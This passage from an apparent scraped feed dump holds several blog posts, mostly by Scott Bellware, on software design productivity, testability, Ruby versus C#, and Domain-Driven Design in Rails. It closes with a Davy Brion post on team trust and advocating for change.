and observe.<br /><br />If you can't directly control and observe your software, you might be<a target=\"_blank\" href=\"http://blog.scottbellware.com/2010/02/mistaking-efficiency-for-productivity.html\">mistaking efficiency for productivity</a>. You're optimizing your work within a range of improvement that is too close to the floor that make a difference in how you to get the lid off the cookie jar.<br /><br />Productivity is right there for you to reach out and harvest. It's locked up in your code like potential energy waiting to be turned into kinetic energy when you free it from its moorings. You can find it in all the ways that design interferes with your ability to work with the software that you already have. There's little value in optimizing the pace that you create new software if you're optimizing the pace that you incur compound interest.<br /><br />Productivity is usually something that you free from your software rather than something you add to software. You create the interference. If you don't want the interference, don't add it to your software.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><br /><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience<br /></p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=W54K-VcJE-A:-LFQ24PjvOY:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=W54K-VcJE-A:-LFQ24PjvOY:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/W54K-VcJE-A\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1065}}

It's difficult to accept where you are if where you are is much further back than you had realized. If you don't accept where you are, you won't progress. If you already feel that you've arrived, you won't screw up the courage to challenge what it is that you know, and embark on that next stage of your career voyage.<br /><br />In the past, we've used the term \"testability\" to describe the quality of design that allows for the kinds of expectations for software development productivity caused by the ability to control and observe. To those who introduced the term to every day software development vernacular, the term has a very specific meaning, and refers to designs that are very specifically evidenced by a set of well-known and observable design principles and patterns. And to others, the term was misinterpreted and misrepresented as software that is tested.<br /><br />\"Testability\" means software that is extremely easy to test rather that software that merely has tests. Any software can be tested, what matters is how incredibly easy it is to do so. The easier it is to test software, the more that the software can be controlled and observed. The more directly that bits of your software can be controlled and observed, the more directly that your software can be understood, and the more that your software design will be simple and clear, and reflect principles productive software design.<br /><br />The level of simplicity in question is usually beyond the realm of possibility for developers who have not had experience with software that is designed to be quickly and readily understood. When the ability to understand software through the ability to control and observe is understood to be the root cause of software development productivity, the software designs that you create will be radically different than what you may have become accustomed to. And while these designs will seem foreign and strange at first, you'll soon learn to see them as the most natural, workable designs that you've created, and that you've worked with.<br /><br />For example, there's no doubt that you can control the content of an application's database from the application's user interface, but that is a far cry from a level of control that will have any significant effect on productivity, not to mention that such a means to control and observe doesn't even begin to guarantee the extent to which all the bits of software in between can be immediately understood. It's still control, and it's still control that can followed up by observation, but it isn't<span style=\"font-style: italic;\">direct control</span>and<span style=\"font-style: italic;\">direct observation</span>. If you're concerned with the behavior of your data access logic, for example, you must be able to control it directly by using your data access logic directly rather than using it transitively through an application's user interface. If you must use your application's user interface to observe the results of the control you exert on your application's database, then you're not able to satisfy your concern directly through direct observation, and you're invariably not gaining any of the great productivity benefits that come from productive design.<br /><br />Be careful of getting ahead of yourself: it doesn't lead to learning of any meaningful significance. Learning to control and observe will bring the biggest advances to your experience of software development productivity. If you stake a claim to this learning before you've barely begun, chances are you'll never really learn what it means and how to use it to any significant degree. And this would be sad, because the means to direct control over your software really isn't difficult to learn. You will be disrupted more by the mass of unlearning of what you already hold firmly as software productivity than by the small amount new learning that you'll really need.<br /><br />If you want to reach into this realm of productivity that is beyond what you've yet experienced, then commit yourself in earnest to be a student of software design principles. Learn how to apply simple software design principles and exercises to productivity. Commit to a journey to master software design from a principled perspective where productivity is your a-priory concern and the thing that you delivery consistently. You'll find that there's really not a lot to learn once you're over the initial interference of what you presently believe.<br /><br />It's vital that when you embark on the exploration of the next realm of software development productivity that you start from a realistic place, and resist every urge to claim victory before you've barely out of sight of your own home port. If you stake a claim to understanding what it is to control and observe your software, you'll deny the vast wealth of productivity that is practically within your reach.<br /><br />It's hard to start down a new path to new understanding, but denying that you need to continue learning and to challenge entrenched orthodoxy is no way to start.<br /><br />Next:<a href=\"http://blog.scottbellware.com/2010/02/how-mainstream-lost-software.html\">How the Mainstream Lost Software Development Productivity</a><br /><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><br /><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience<br /></p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=4qQ92GXNC04:545gNgMQI_0:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=4qQ92GXNC04:545gNgMQI_0:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/4qQ92GXNC04\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1066}}

In fact, much of Ruby is heretical to a C# or VB.NET mono–culture, but the productivity gains demonstrated by Ruby on Rails teams remains an unavoidable elephant in the room. This presentation looks at C# code examples side by side with some equivalent Ruby code and shines a little light on what it means to have either \"ceremony\" and \"essence\". It challenges the claims of static typing's effect on tooling to deliver \"developer productivity\". And finally, some examples of Ruby meta programming are given to demonstrate direct solutions to programming problems that would require much ado with restrictions in C# that don't end up doing much more than reducing the efficiency of software development efforts.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=8e0zGrXBZec:_TMHvzc_kcE:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=8e0zGrXBZec:_TMHvzc_kcE:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/8e0zGrXBZec\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1067}}

When you're new to an existing project, you can easily understand the code that has already been written by your new team. Understanding how to design software so that you're able to easily<a href=\"http://blog.scottbellware.com/2010/02/to-control-and-observe-productive.html\" target=\"_blank\">control and observe</a>it gives you the ability to create software that can be understood, and software that doesn't obstruct productivity.<br /><br />Despite the number of software developers who understand the mechanics and principles of software design that cultivate software development productivity, the vast majority of software developers don't understand how to wield the techniques, or aren't convinced by the promises, or simply haven't heard about higher order developer productivity at all, let alone how to get it.<br /><br />Somewhere along the line, the software development mainstream lost its access to productivity, and the vacuum was filed with<a href=\"http://blog.scottbellware.com/2010/02/mistaking-efficiency-for-productivity.html\" target=\"_blank\">counter productivity or productivity proxies</a>.<br /><br />Two things contributed to the mass extinction of software development productivity in the mainstream: Eggheads and Shills. The eggheads allowed a divide to open between the intellectual<span style=\"font-style: italic;\">haves</span>and the<span style=\"font-style: italic;\">have-nots</span>, and the shills exploited that gap, filling it with misinformation and misrepresentations, verily redefining \"productivity\" and supplanting it with mere efficiency.<br /><br />Yes, these labels are chosen for shock value. Specifically because this is an issue that is largely rooted in unconsciousness: the unconsciousness of failing to communicate, and the unconsciousness of deeper meaning.<br /><br />I've learned quite a bit about software development and design from some very insightful and intelligent people. I'm grateful to the authors who've been my long distance mentors and who have provided me with inspiration. I've met many of them in person over the past half decade or so and these encounters have deepened my pursuit of understanding ever further.<br /><br />Now that I have a much better understanding of what it is that they taught me, I'm shocked at how poorly this material was often communicated and at how our self-indulgent vanity continues to get in the way of broader communication of ideas that are vital to contemporary society's productivity at a time when productivity is so desperately needed.<br /><br />I use the term \"Egghead\" with some affection and admiration, but I also use it in the hopes that some of the great teachers of software development and design will come to learn that they've barely even scratched the surface of the full audience that they need to reach. Eggheads write and speak for other eggheads. The language they chose and the names given to design principles, as well as practices and patterns are stimulating to other eggheads and yet utterly obstructive to the other part of the software development population. When you measure the Egghead population against the mainstream population, the Egghead population doesn't appear to be much more than a rounding error. There's a lot of work to do, and we can do it much better.<br /><br />Eggheads preach to the choir, and this is often so stimulating that they never leave the echo chamber. They don't learn how to reach the mainstream. They hope that the people they do reach will somehow reach the mainstream, but those people usually end up emulating their egghead heros and become eggheads themselves. The circle expands slightly, but not merely enough to have the meaningful effect on software development productivity that their knowledge and understanding should already have had.<br /><br />Their communication style is rife with self-stimulating, overly-academic legalese  that does little more than enforce an over-estimation of the value of the terminology itself rather than subjugate the terminology to the absolute must of communicating simple and powerful ideas to the mainstream. Eggheads don't like to engage directly with the mainstream. They don't learn to talk to the mainstream and how to teach the mainstream. In this, their self-indulgence leads to terrific loss for human society and is quite possibly one of the most negligent acts perpetrated against the potential for software development productivity.<br /><br />The divide between the Egghead echo chamber and the mainstream has been readily filled by Shills. While the Eggheads fascinate themselves with themselves, the Shills convince the mainstream to buy snake oil solutions to problems that could be easily solved with plain old soap and water.<br /><br />The potential for abuse and the leadership vacuum left behind by the Eggheads' self-glorification is readily taken advantage of by Shills willing to convince the mainstream that mere efficiency tools are good solutions for productivity problems. They further exasperate the productivity problems that result from applying efficiency solutions to productivity problems and use the ensuing mainstream customer panic to justify yet more efficiency tools. The mainstream becomes ever more isolated from more meaningful understandings of software development productivity and continues to spin out of control on the back of software systems and software projects that are themselves out of control.<br /><br />Between the Eggheads and the Shills, things look pretty grim. Those who have good answers to the<a href=\"http://en.wikipedia.org/wiki/Software_crisis\" target=\"_blank\">software crisis</a>are unwilling to forgo the stimulating academic formalism in favor of connecting with the mainstream, and those who would take advantage of ignorance do take advantage of ignorance.<br /><br />Neither of these two archetypes can be counted on to fix the problem. Eggheads are far too ensconced in the comforts of elitism and Shills have built behemoth networks of companies all selling the same pack of lies, damned lies, and demos. The momentum and justifications of either aren't likely to change anytime soon.<br /><br />What's needed is a new generation of productivity missionaries who are willing to master the field of knowledge and are willing to learn to connect with the mainstream. They're willing forgo the all-consuming pursuit of elite celebrity and serve society by taking on the software crisis head-on as a matter of honor and duty in the face of continuing negligence and abuse on all sides. They are willing to speak plainly and openly and forgo the perceived legitimization that comes from falling into step with esoteric formalism.<br /><br />The mainstream has lost track of software development productivity, but it's not so far removed that it can't be recovered. It just can't be recovered through the continued self-indulgence underpinning both the Egghead and the Shill entitlement to ease and winnings in the face of disastrous effects on modern productivity. It can be recovered if pathfinders and communicators are willing to get dirty amongst the \"unwashed masses\" for an even greater return, and to stand fast against the encroachments of suboptimal local efficiencies bundled with six-figure price tags and promises of yet more software development pain.<br /><br />Next:<a href=\"http://blog.scottbellware.com/2010/02/productive-by-design.html\">Productive by Design</a><br /><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><br /><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience<br /></p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=o2t8Ir5oerw:IZbbhazWAUk:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=o2t8Ir5oerw:IZbbhazWAUk:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/o2t8Ir5oerw\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1068}}

And... is the Domain-Driven Design used in .NET pop culture really Domain-Driven Design in fact, or is it a lighter Domain-Driven Design that leans mostly on the DDD pattern language and remains somewhat naive about DDD? If these questions are indeed valid questions, and if they're being asked by leading DDD practitioners, then is the question about Rails and DDD a question rooted in valid presumptions, or is it coming from a perspective that stands on shaky ground to begin with?<br /><br />Here's an admittedly-provocative question: Do the .NET developers who are wondering whether Rails is for lessor apps (as evidenced by the absence of explicit Domain-Driven Design) actually have a firm grasp of what Domain-Driven Design is, or are they merely using a pattern language and suffering the self over-estimation that is far too common in technology orthodocracies?<br /><br />I think there's a missing piece in the inquiry. We're failing to ask whether Domain-Driven Design can be accomplished with the Active Record pattern, or can it only be achieved with the Domain Model pattern?<br /><br />Furthermore: Is the Active Record pattern the only model object pattern used in Rails apps?<br /><br />Rails is often about the part of the app that often deals with user interaction, or more specifically: user agent interaction. Do you need to use Domain-Driven Design for this<span style=\"font-weight: bold; font-style: italic;\">part</span>of your app? Maybe you do. Maybe you already do. Maybe you already use Domain-Driven Design for this part of your app but you're not yet aware that you're only using the DDD pattern language to name archetypes and layer supertypes in your design. After all, it's not like there's a lack of precedent for this in .NET apps \"using\" Domain-Driven Design. It might even be the most common form of DDD in .NET.<br /><br />One of the most salient teachings to come away from Domain-Driven Design with is<a href=\"http://www.cidrdb.org/cidr2007/papers/cidr07p15.pdf\">Partitioning</a>- conceptual, physical, and logical. Partitioning is reflected in Domain-Driven Design's Aggregate Root pattern, its Repository Pattern, and its Bounded Context pattern, amongst others. The increasing attention given to eventual consistency and Command-Query Responsibility Separation (CQRS) in context of Domain-Driven Design also reflects partitioning and its effects and considerations.<br /><br />Rails' - the framework - has absolutely nothing to say about partitioning. And its not supposed to. Partitioning is about a solution's topology and architecture. Rails is about building the user-interactive strata of an app. What you do behind the scenes is entirely out of Rails' hands. Rails itself - including its models - are a descriptive DSL over the abstractions that are over the infrastructure. You can make Rails archetypes as loosely or tightly coupled as you want (although you might be taking the Rails part of your app in the wrong architectural direction if you pursue extensive schema de-coupling, and you might need to be a pretty solid Rails hacker to do so).<br /><br />That said, the Rails ecosystem has built a plethora of plugins for the framework that allow these architectural styles to be accommodated in a solution where Rails is in-play. In the wild, partitioning is one of the most obvious aspects of solutions that are front-ended by Rails.<br /><br />Large-scale apps like Shopify, Gowalla, GitHub, Hulu, Scribd, Highrise, Yellow Pages, etc, don't get built without partitioning, and separating write from read operations. And you can't build a Rails app without modeling - whether you do modeling in your head, in code, or with diagrams (all are supported, bu the way). You can't build any of the non-public line of business Rails apps being built by organizations like Amazon, Electronic Arts, IBM, JP Morgan, NASA, Yahoo, Rackspace and a host of others, without tackling complexity at the heart of software design, and doing so in a way that insulates the non-complex part of your app with the complex part of your app, and dealing with them on their own terms without one tripping all over the other.<br /><br />So, is the Active Record pattern sufficient for building Domain-Driven Design apps? Again, it goes back to how much you feel you should drive the whole topology and architecture of your whole solution from a framework that is intended to serve one aspect of solution architecture.<br /><br />Domain-Driven Design is often trivialized to being merely a ubiquitous language (which is yet another DDD concept that itself is often trivialized into a meaninglessness that ignores other DDD precepts), entity classes, repository classes, service classes, and specification classes, and a smattering of other often-obscured concepts in the DDD heritage.<br /><br />There's still something to learn from this form of DDD, but let's get serious for a moment: it's often just DDD as a pattern language, or \"DDD Light\" (now with 90% less real complexity!).<br /><br />The average .NET app using Domain-Driven Design could, in my experience, be done for much less if done in the Rails ecosystem. Apps that use DDD inappropriately sometimes even end up needing more DDD because developers and designers have added insurmountable accidental complexity. There's nothing that contradicts DDD's essential message more than adding complexity to a solution!<br /><br />Active Record, Rails, and Ruby, used in the parts of an app where its appropriate, don't contradict DDD. Without any question, it absolutely will change the pattern language used to describe the part of the app where you use Rails - but usually, that's all it does. If all you can see of Domain-Driven Design, however, is the pattern language, then you likely won't be able to use Domain-Driven Design even when you believe that you are using it.<br /><br />There's little need for a Repository archetype in Rails. That said, Rails apps often do exhibit the essence of the repository pattern in the resource-oriented idioms (Aggregate Root, Repository, Specification, Context, Contours) that are ubiquitous in the Rails developer and architecture culture. Do you need to have a Repository<span style=\"font-weight: bold; font-style: italic;\">class</span>in order to be responsible about partitioning and to provide collection-oriented semantics for aggregate root access? For that matter, can you build a Domain-Driven Design app in programming language that doesn't have any notion of what a \"class\" is? If you can't have a Repository<span style=\"font-style: italic;\">class</span>can you still do Domain-Driven Design?<br /><br />Do you ever hang data access operations off of a Repository class that aren't consistent with Repository or Aggregate Root semantics? Ever pull a lazy-loaded instance of Product from an OrderItem instance without going through a Product Repository? The question here isn't whether you've violated DDD in this case, but whether DDD's necessary constraints serve you well in these situations, and whether you should be trying to impose these constraints on this particular part of the whole architecture.<br /><br />In my experience, there's as much Domain-Driven Design happening in the Rails world as in the .NET world. The big difference is that in the Rails world there's no social capital to be gained by speaking in the DDD pattern language in social gatherings of programmers trying to make their way in the professional world. Rails developers tend to just point to the game-changing web innovations and properties they've built and leave it at that.<br /><br />One last thing about Domain-Driven Design and .NET: .NET developers tend to not recognize that using DDD as a pattern language is in essence a way to have an elaborated pattern language for Dependency Injection, as the design archetypes borrowed from DDD are usually either layer supertypes or archetypes of injected dependencies in static languages.<br /><br />DDD Light is a side-effect of a programming paradigm where composition can largely only be achieved through Class-Oriented Programming. When the paradigm changes, and composition is something that the language itself can do, the propensity for DDD Light tends to dissipate. And that is why you tend to have less<span style=\"font-style: italic;\">explicit</span>mention of DDD in Rails' culture. DDD Light is as necessary in Rails as explicit, class-oriented composition and static dependency injection is. That's to say: it isn't (always). This was another topic briefly touched on by the Herding Code episode.<br /><br />The necessity for Domain-Driven Design in fact and in practice in Rails is already well-established. Rails folks are just less-interested in talking about it in DDD terms, and not at all interested in DDD Light, as it's orthogonal to the paradigm - both socially and technically.<br /><br />Rails - the culture and ecosystem - doesn't do DDD Light as the .NET culture and ecosystem does. That's about all we can really say about Rails and DDD.<br /><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=M1sVnr1_xlc:eA4glWVceHM:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=M1sVnr1_xlc:eA4glWVceHM:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/M1sVnr1_xlc\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1069}}

A lot of us have felt that way. I certainly have as well a few times in the past. The 2 most common excuses you'll hear for not believing something can work are:</p><ol><li><p>The people I work with aren't good/talented/disciplined enough to make this work.</p></li><li><p>It can't possibly work in our organization.</p></li></ol><p>The truth though, is that it's actually because of <em>you</em>. Whenever you say \"that won't work for us\" or something similar because of the people you work with, you immediately show your lack of faith in them. You might think that that lack of faith is justified, but that basically means you've given up all hope of making things better. You know it, and worst of all, <em>they know it too</em>. People who aren't trusted by their coworkers or superiors generally pick up on that rather quickly. Some of them will respond by putting in more effort and trying to do better. Others will become demotivated and wonder why they should even try because \"it's never good enough anyway\". At this point, your lack of trust in your coworkers becomes a self-fulfilling prophecy.</p><p>You might want to consider another approach. Think back on how you've responded to situations where you where challenged by coworkers or superiors but where it was clear that they trusted you and believed that you were capable of doing a better job. I'd bet that for most of you, it improved your motivation and your willingness to do better. It probably helped you bring out the best in you. You can use this to your advantage when you're trying to get better results out of your coworkers. It's quite simple really: it's all about how you approach someone. If you want somebody to do better, and you approach them in a positive manner you're much more likely to get better results. If however, they sense your distrust (and most people pick up on that quite easily), they will most likely be defensive or apprehensive. The odds are quite low that something good will come out of that.</p><p>If you want people to improve and do better, it's important to establish a culture where everybody knows that it's <em>ok</em> to make mistakes, and that every mistake is an opportunity for the whole team to get better. If that's not the case in your situation, what is preventing you from trying to get to that point? Even if you're not officially in a leadership position, there's no reason why you can't set the tone and <em>be a leader</em>. Start making an impact on one or two people and build off of that growth. Once you've got a few people convinced, it's much easier to bring the rest along with you. You don't need to shoot for the stars from the beginning either. Try to improve whatever it is you think needs improvement with small steps, in an iterative approach. Instead of thinking \"that will never work for my team\", think \"we're not quite ready for that <em>yet</em>, but we will be someday\".</p><p>If you believe you can't improve your way of working due to organizational reasons, it's important to also start with your team. It's easy for management to ignore the opinion of one person, but it gets progressively harder for them to ignore it as more and more people start asking for change. It's much easier to persuade management to try something new if you can show that the whole team believes it's worth a shot. Keep pressing the issue until you get the chance to try it for a short time. If you keep asking for it, management might just get tired of hearing it and who knows, they'll grant you some time to try it out. You'll never know if you stop trying.</p><p>Of course, you won't always succeed in convincing management or your coworkers. But you've gotta try. And if you keep hitting walls, you might actually be better off moving on to another job with other people instead of being frustrated in your current position. Even if you don't agree with what I'm saying in this post, you can't possibly disagree with this: not trying will get you nowhere.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=vmRCqUkdXLU:0dHmB8pfeyA:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=vmRCqUkdXLU:0dHmB8pfeyA:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=vmRCqUkdXLU:0dHmB8pfeyA:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/vmRCqUkdXLU\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1092}}

